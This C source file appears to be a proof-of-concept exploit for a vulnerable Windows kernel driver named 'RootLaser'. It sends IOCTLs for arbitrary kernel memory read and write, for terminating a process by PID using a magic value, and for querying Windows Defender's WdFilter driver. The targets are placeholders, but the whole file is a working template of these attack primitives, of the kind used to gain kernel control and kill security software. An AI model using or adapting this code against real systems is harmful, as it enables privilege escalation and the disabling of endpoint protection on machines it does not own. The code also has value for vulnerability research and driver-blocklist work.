#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#define DEVICE_PATH                 "\\\\.\\RootLaser"

// IOCTL Control Codes
#define IOCTL_ARBITRARY_READ        0x22E050
#define IOCTL_ARBITRARY_WRITE       0x22E014
#define IOCTL_TERMINATE_PROCESS     0x22E044
#define IOCTL_LEAK_DRIVER_INFO      0x22E05C

// 0x22E050 → sub_140001664 (Arbitrary Kernel Read)
// 0x22E014 → sub_1400017A0 (Arbitrary Kernel Write / Indexed Setter)
// 0x22E044 → sub_1400016B8 (Process Termination)
// 0x22E05C → sub_1400011C4 (Driver Information Leak)

#pragma pack(push, 1)
typedef struct _KILL_REQUEST {
    uint32_t MagicValue;
    uint32_t ProcessId;
} KILL_REQUEST;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct _KRNL_READ_REQ {
    uint64_t Address; // Offset 0x00: Target kernel address to read from (*a1)
    uint32_t Size;    // Offset 0x08: Number of bytes to read (*((unsigned int*)a1 + 2))
    uint32_t Padding; // Offset 0x0C: 4 bytes of padding to satisfy the >= 16-byte (0x10) input check
} KRNL_READ_REQ;
#pragma pack(pop)

// Helper function to print hex dumps
void PrintHexDump(const char* title, const unsigned char* buffer, size_t size) {
    printf("\n%s (%zu bytes):\n", title, size);
    if (!buffer || size == 0) return;
    for (size_t i = 0; i < size; ++i) {
        if (i % 16 == 0) printf("  %04zX: ", i);
        printf("%02X ", buffer[i]);
        if ((i + 1) % 16 == 0 || i == size - 1) printf("\n");
    }
}

int main(void) {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    DWORD bytesReturned = 0;

    printf("[*] Connecting to driver: %s\n", DEVICE_PATH);
    hDevice = CreateFileA(
        DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to connect to driver. Error: %lu\n", GetLastError());
        printf("    -> Ensure you are running with Administrator privileges.\n");
        return 1;
    }
    printf("[+] Successfully established handle to driver.\n");

    // ==========================================
    // STEP 2: Arbitrary Kernel Read (0x22E050)
    // ==========================================
    {
        printf("\n=========================================\n");
        printf("STEP 2: Arbitrary Kernel Read (Demo)\n");
        printf("=========================================\n");

        KRNL_READ_REQ readReq = { 0 };
        unsigned char readBuffer[64] = { 0 };

        // Dummy/placeholder kernel address (will trigger driver error or return safe status depending on validity)
        readReq.Address = 0xFFFFF80000000000ULL; 
        readReq.Size = sizeof(readBuffer);

        printf("[*] Reading %llu bytes from dummy kernel address: 0x%llX...\n", readReq.Size, readReq.Address);

        BOOL bResult = DeviceIoControl(
            hDevice, IOCTL_ARBITRARY_READ,
            &readReq, sizeof(readReq),
            readBuffer, (DWORD)readReq.Size,
            &bytesReturned, NULL
        );

        if (!bResult) {
            printf("[-] Kernel read failed (expected if address is unmapped). Error: %lu\n", GetLastError());
        } else {
            PrintHexDump("Kernel Read Result", readBuffer, (size_t)readReq.Size);
        }
    }


    // ==========================================
    // STEP 3: Arbitrary Kernel Write (0x22E014)
    // ==========================================
    {
        printf("\n=========================================\n");
        printf("STEP 3: Arbitrary Kernel Write (Demo)\n");
        printf("=========================================\n");

        uint8_t writeBuffer[32] = { 0 };
        
        // Dummy/placeholder target address and value
        uint64_t dummyTargetAddr = 0xFFFFF80000000000ULL;
        uint64_t dummyValToWrite = 0xDEADBEEFCAFEBABEULL;

        // Map layout matching driver expectations
        *(uint32_t*)(writeBuffer + 0)  = 0xEE00AA77;
        *(uint64_t*)(writeBuffer + 8)  = dummyTargetAddr;
        *(uint32_t*)(writeBuffer + 16) = 0;
        *(uint64_t*)(writeBuffer + 24) = dummyValToWrite;

        printf("[*] Writing dummy value 0x%llX to 0x%llX...\n", dummyValToWrite, dummyTargetAddr);

        BOOL bResult = DeviceIoControl(
            hDevice, IOCTL_ARBITRARY_WRITE,
            writeBuffer, sizeof(writeBuffer),
            NULL, 0, &bytesReturned, NULL
        );

        if (!bResult) {
            printf("[-] Kernel write failed (expected for dummy address). Error: %lu\n", GetLastError());
        } else {
            printf("[+] Kernel write executed successfully.\n");
        }
    }


    // ==========================================
    // STEP 4: Process Termination (0x22E044)
    // ==========================================
    {
        printf("\n=========================================\n");
        printf("STEP 4: Terminate Process by PID (Demo)\n");
        printf("=========================================\n");

        KILL_REQUEST killReq = { 0 };
        killReq.MagicValue = 0xEE00AA77;
        
        // Non-existent dummy PID to prevent accidental system disruption during demo
        killReq.ProcessId = 99999; 

        printf("[*] Sending termination IOCTL for dummy PID %u...\n", killReq.ProcessId);

        BOOL bResult = DeviceIoControl(
            hDevice, IOCTL_TERMINATE_PROCESS,
            &killReq, sizeof(killReq),
            NULL, 0, &bytesReturned, NULL
        );

        if (!bResult) {
            printf("[-] Termination failed (expected for non-existent PID). Error: %lu\n", GetLastError());
        } else {
            printf("[+] Process termination IOCTL successfully executed.\n");
        }
    }
	
	// ==========================================
    // STEP 1: Leak Driver Information (0x22E05C)
    // ==========================================
    {
        printf("\n=========================================\n");
        printf("STEP 1: Leak Driver Information (Demo)\n");
        printf("=========================================\n");

        wchar_t driverName[MAX_PATH] = L"\\Driver\\WdFilter";
        unsigned char outputBuffer[1448] = { 0 };

        wprintf(L"[*] Querying info for target driver: %ls\n", driverName);
        DWORD inputSize = (DWORD)((wcslen(driverName) + 1) * sizeof(wchar_t));

        BOOL bResult = DeviceIoControl(
            hDevice, IOCTL_LEAK_DRIVER_INFO,
            driverName, inputSize,
            outputBuffer, sizeof(outputBuffer),
            &bytesReturned, NULL
        );

        if (!bResult) {
            printf("[-] Driver info leak failed. Error: %lu\n", GetLastError());
        } else {
            printf("[+] Success! Bytes returned: %lu\n", bytesReturned);
            PrintHexDump("Driver Info Buffer (Snippet)", outputBuffer, 64);
        }
    }

    // Cleanup
    CloseHandle(hDevice);
    printf("\n[+] Autonomous demo execution finished. Handle closed.\n");
    return 0;
}